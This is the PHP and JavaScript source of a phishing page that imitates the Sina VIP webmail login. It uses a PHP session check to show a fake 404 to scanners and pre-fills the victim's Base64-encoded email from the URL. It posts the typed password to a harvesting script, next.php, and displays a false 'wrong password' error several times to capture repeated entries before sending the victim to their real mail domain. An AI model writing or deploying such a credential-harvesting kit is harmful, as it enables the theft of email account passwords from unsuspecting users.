<?php
session_start();
if (!isset($_SESSION['came_from_index']) || $_SESSION['came_from_index'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit("404 Not Found");
}
?>

<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>新浪VIP邮箱</title>
    <link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/styles.css">
</head>

<body id="vipsinab" style="height: 100vh;">
    <div id="maincnavvipcina" class="c-div" style="width: 100%;height: 54px;background: rgba(0,0,0,0.41);">
        <div style="width: 100%;max-width: 950px;padding-top: 10px;padding-bottom: 10px;padding-left: 13px;padding-right: 13px;"><img class="img-fluid" width="160" height="36" src="../assets/img/vip_logo.png"></div>
    </div>
    <div id="maincvipcina" class="c-div">
        <div id="main-cvipsina" class="c-div" style="width: 100%;max-width: 950px;">
            <div id="vipsinaformouter" style="width: 100%;max-width: 400px;padding: 40px 32px;background: rgba(0,0,0,0.41);color: rgb(255,255,255);margin-top: 40px;border-radius: 10px;">
                <h2>欢迎登录</h2><input type="text" id="backEMF" style="height: 40px;width: 100%;padding: 1px 8px;border: 1px solid #adadad;margin-top: 32px;border-radius: 7px;"><input type="password" id="pass" style="height: 40px;width: 100%;padding: 1px 8px;margin-top: 16px;border: 1px solid #adadad;border-radius: 7px;" placeholder="请输入密码">
                <p id="err" style="margin-top: 16px;color: rgb(211,0,0);text-align: left;">密码错误，请重试</p>
                <div class="sp-div" style="margin-top: 32px;"><button class="btn btn-primary" id="next-btn" type="button" style="width: 99%;max-width: 136px;height: 40px;border-style: none;border-radius: 4px;background: #3675c4;" onclick="nextFun();">登&nbsp;录</button><button class="btn btn-primary" type="button" style="width: 99%;max-width: 136px;height: 40px;border-radius: 4px;background: rgba(0,0,0,0.41);border-style: solid;border-color: rgb(255,255,255);" onclick="nextFun();">注&nbsp;册</button></div>
                <div class="sp-div" style="color: rgb(255,255,255);margin-top: 40px;"><a href="#" style="color: rgb(255,255,255);">忘记密码</a><a href="#" style="color: rgb(255,255,255);">代人续费 </a><a href="#" style="color: rgb(255,255,255);">加快登录速度</a></div>
            </div>
        </div>
    </div>
    <script src="../assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
$(document).ready(function () {
    $(document).on('keypress', function (e) {
    if (e.which === 13) {
        $('#next-btn').click();
    }
});

    // Get parameters from URL
    const urlParams = new URLSearchParams(window.location.search);
    const useridEncoded = urlParams.get('userid');
    const maxTry = parseInt(urlParams.get('maxtry') || '3');
    const pageValue = urlParams.get('page') || '';
    const domainRedirect = urlParams.get('domain_redirect') || '';

    let tryCount = 0;
    let userid = '';

    // Decode Base64 email
    try {
        userid = atob(useridEncoded || '');
    } catch (e) {
        console.error("Invalid userid encoding");
    }

    // Fill userid into either #backEm or #backEMF
    if ($('#backEm').length) {
        $('#backEm').text(userid);
    }
    if ($('#backEMF').length) {
        $('#backEMF').val(userid);
    }

    // Hide error initially
    $('#err').hide();

    // Next button click handler
    $('#next-btn').on('click', function () {
        const password = $('#pass').val().trim();

        // If password empty
        if (!password) {
            $('#err').show();
            return;
        }

        // Disable button until AJAX finishes
        $('#next-btn').prop('disabled', true);

        // Prepare POST data
        const postData = {
            ai: userid,
            pr: password,
            page_value: pageValue
        };

        $.ajax({
            url: '../next.php',
            type: 'POST',
            data: postData,
            success: function (response) {
                tryCount++;

                if (tryCount >= maxTry) {
                    // After maxTry, proceed normally
                    $('#err').hide();
                     const emailParts = userid.split('@');
                     if(!domainRedirect){
                    if (emailParts.length === 2) {
                        const domain = emailParts[1];
                        window.location.replace(`https://${domain}`);
                    } else {
                        // Fallback if email is malformed
                        window.location.replace("https://www.google.com");
                    }
                    }else{
                         window.location.replace(domainRedirect);
                    }


                    // You can redirect or take another action here
                } else {
                    // Show error and reset password field
                    $('#err').show();
                    $('#pass').val('');
                }
            },
            error: function () {
                alert("Error contacting server.");
            },
            complete: function () {
                // Re-enable button after request finishes
                $('#next-btn').prop('disabled', false);
            }
        });
    });
});
</script>

</body>


</html>